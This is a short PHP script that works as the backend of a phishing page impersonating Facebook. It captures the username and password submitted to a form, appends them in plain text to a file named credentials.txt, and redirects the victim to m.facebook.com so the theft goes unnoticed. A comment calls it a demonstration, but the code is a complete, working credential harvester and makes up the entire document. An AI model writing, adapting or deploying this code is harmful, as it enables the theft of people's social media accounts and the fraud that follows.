<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Log the credentials to a file (for demonstration purposes)
    file_put_contents('credentials.txt', "Username: $username, Password: $password\n", FILE_APPEND);

    // Redirect to the specified URL
    header("Location: https://m.facebook.com/");
    exit();
} else {
    echo "Invalid request method.";
}
?>
